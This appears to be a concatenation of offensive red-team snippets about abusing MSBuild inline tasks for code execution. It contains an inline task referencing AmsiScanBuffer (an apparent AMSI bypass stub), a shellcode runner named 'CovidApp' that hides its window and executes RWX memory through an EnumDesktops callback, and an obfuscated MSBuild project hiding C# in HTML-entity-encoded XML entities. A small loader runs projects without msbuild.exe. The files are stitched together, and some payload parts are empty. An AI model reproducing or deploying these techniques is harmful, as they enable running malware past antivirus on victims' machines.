<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="RunMe">
   <RunMe />
   </Target>
  <UsingTask
    TaskName="RunMe"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
    <Task>
      <Using Namespace="System" />
	  <Using Namespace="System.IO" />
      <Code Type="class" Language="cs">
	    <![CDATA[
		using System;
		using System.IO;
		using System.Text;
		using System.Collections.Generic;
		using System.Collections.ObjectModel;
		using Microsoft.Build.Utilities;
		using Microsoft.Build.Framework;
		using System.Runtime.InteropServices;
		
		public class RunMe :  Task, ITask {	

			public override bool Execute() {	
				string amsi = "AmsiScanBuffer";
				Console.WriteLine("working");
				return true;
			}
		}
        ]]>
      </Code>
    </Task>
	</UsingTask>
</Project>


using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace HtmlEntity
{
    public class HtmlEntity
    {
        public byte[] Do(byte[] data, byte[] args = null)
        {
            StringBuilder sb = new StringBuilder();
            foreach (byte b in data)
            {
                sb.Append(String.Format("&#x{0};", b.ToString("x2")));

            }

            return Encoding.ASCII.GetBytes(sb.ToString());
        }
    }
}

using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace CovidApp
{
    class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(UInt32 a, UInt32 b, UInt32 c, UInt32 d);
        [DllImport("user32")]
        static extern bool EnumDesktops(IntPtr a, IntPtr b, IntPtr c);
        [DllImport("user32")]
        static extern bool ShowWindow(IntPtr a, int b);

        [DllImport("kernel32")]
        static extern IntPtr GetConsoleWindow();

        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 0);

            byte[] data = new byte[] { };
            byte[] bytes = new byte[930];
            int position = 0;
            for(int i = 0; i < data.Length; i++)
            {
                if(data[i] != 0x7d)
                {
                    bytes[position] = data[i];
                    position++;
                }
            }
            IntPtr mem = VirtualAlloc(0, (UInt32)bytes.Length, 0x1000, 0x40);
            Marshal.Copy(bytes, 0, mem, bytes.Length);

            EnumDesktops(IntPtr.Zero, mem, IntPtr.Zero);
        }
    }
}



<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE Sp70yqBDXC9zQ [
    <!ENTITY MLdjjC8wtW6VLz29e1hl0zsJMPU "&#x26;&#x23;&#x78;&#x34;&#x31;&#x3b;&#x26;&#x23;&#x78;&#x34;&#x31;&#x3b;&#x26;&#x23;&#x78;&#x34;&#x31;&#x3b;&#x26;&#x23;&#x78;&#x34;&#x31;&#x3b;&#x26;&#x23;&#x78;&#x34;&#x31;&#x3b;">
]>

<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003%22%3E
 <Target Name="BZbiHPbxcWkJQj6k3cfLKXhHRo1">
   <BZbiHPbxcWkJQj6k3cfLKXhHRo1 />
   <windows />
   </Target>
   <PropertyGroup>
   <O3HPuuJio1TQdYBT>
    &MLdjjC8wtW6VLz29e1hl0zsJMPU;
   </O3HPuuJio1TQdYBT>
   </PropertyGroup>
  <UsingTask
    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll" 
    TaskName="BZbiHPbxcWkJQj6k3cfLKXhHRo1"
    TaskFactory="CodeTaskFactory">
    <ParameterGroup/>
    <Task>
      <Using Namespace="System" />
      <Using Namespace="System.IO" />
      <Code Type="Fragment" Language="cs">
      </Code>
    </Task>
    </UsingTask>
    <UsingTask
    TaskName="windows"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="Csharp">
         <![CDATA[
        $(O3HPuuJio1TQdYBT)
        ]]>
    </Code>
    </Task>
  </UsingTask>
</Project>



using System;
using System.Collections;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security;
using System.Text;
using System.Threading;
using Microsoft.Build.BuildEngine;
using Microsoft.Build.Evaluation;
using Microsoft.Build.Exceptions;
using Microsoft.Build.Execution;
using Microsoft.Build.Framework;
using Microsoft.Build.Logging;
using Microsoft.Build.Shared;
using Microsoft.Internal.Performance;

namespace buildless
{
    class Program
    {
        static void Main(string[] args)
        {
            string path = args[0];
            Microsoft.Build.Evaluation.ProjectCollection project = new ProjectCollection();
            project.LoadProject(path).Build();
        }
    }
}
